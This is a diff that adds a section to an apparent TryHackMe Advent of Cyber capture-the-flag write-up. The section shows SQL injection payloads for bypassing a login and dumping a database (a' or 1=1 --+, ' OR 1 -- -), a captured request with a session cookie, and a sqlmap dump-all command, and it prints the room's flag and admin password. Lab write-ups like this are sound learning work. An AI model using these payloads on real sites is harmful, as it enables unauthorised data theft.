@@ -121,7 +121,46 @@ Flag - THM{D4t3_AP1}
 
 ## Someone stole Santa's gift list
 
+```markdown
+According to given case, we have to access the website <http://10.10.34.237:8000/> and replicate a SQLi attack.
+
+For sqlmap, we can use this cheatsheet: <https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet>
+
+From the clue given, we can guess that the secret login panel for the website is in /santalogin
+
+To bypass the login, we can enter " a' or 1=1 --+ " in the password field and submit. This gives us access to the panel.
+
+On using the search field with the payload " ' OR 1 -- - " , we find out that there are 22 entries in the database; Paul has asked for 'github ownership'.
+
+Now, to get the complete database, we will have to use sqlmap and Burp Suite together.
+
+Once we have access to login, we can capture the request for searching the database in /santapanel, and forward that request to Repeater; then we can save item and use sqlmap
+
+This will give us access to the databases
+```
+
+```markdown
+This is how the request in Burp Suite would look like:
+
+GET /santapanel?search=apple HTTP/1.1
+Host: 10.10.34.237:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://10.10.34.237:8000/santapanel
+Cookie: session=eyJhdXRoIjp0cnVlfQ.YmU5Ww.DKmuj42iMNRkVYJNdBpNdk2zwfM
+Upgrade-Insecure-Requests: 1
+```
+
 ```shell
+#with the request file saved, we can use sqlmap
+sqlmap -r nameofrequestfile --tamper=space2comment --dbms=SQLite --dump-all
+#dumps all info
+
+#flag - thmfox{All_I_Want_for_Christmas_Is_You}
+#admin password - EhCNSWzzFP6sc7gB
 ```
 
 ## Be careful with what you wish on a Christmas night
